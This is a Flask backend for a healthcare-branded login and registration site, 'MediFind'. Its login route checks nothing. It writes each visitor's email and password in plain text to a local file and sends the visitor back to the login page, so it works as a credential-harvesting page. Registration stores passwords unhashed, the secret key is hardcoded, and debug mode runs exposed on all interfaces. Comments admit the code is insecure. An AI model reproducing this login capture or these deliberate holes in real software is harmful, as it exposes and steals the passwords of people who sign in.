import os
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
from werkzeug.security import generate_password_hash, check_password_hash
from models import db, User

app = Flask(__name__)

# Use Railway database
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL1').replace("postgres://", "postgresql://", 1)
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db.init_app(app)

# Create tables on startup
with app.app_context():
    db.create_all()
    try:
        db.session.execute(text("SELECT 1"))
        print("✅ Database connection successful!")
    except Exception as e:
        print("❌ Database connection failed:", e)

# Secret key
app.secret_key = 'kenya_healthcare_secret_2023_@medifind!'

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        # Save credentials to plain text file (insecure - for demo only)
        with open('credentials.txt', 'a') as f:
            f.write(f"Email: {email} | Password: {password}\n")

            return redirect(url_for('login'))

    return render_template('login.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        # Store password directly in plain text (INSECURE)
        new_user = User(email=email, password=password)
        db.session.add(new_user)
        db.session.commit()

        flash("✅ Registered successfully! Please log in.", "success")
        return redirect(url_for('login'))

    return render_template('register.html')






@app.route('/test-db')
def test_db():
    result = db.session.execute(text("SELECT 1")).scalar()
    return f"Database OK: {result}"


if __name__ == '__main__':
    print("Starting MediFind backend...")
    app.run(host='0.0.0.0', port=5000, debug=True)
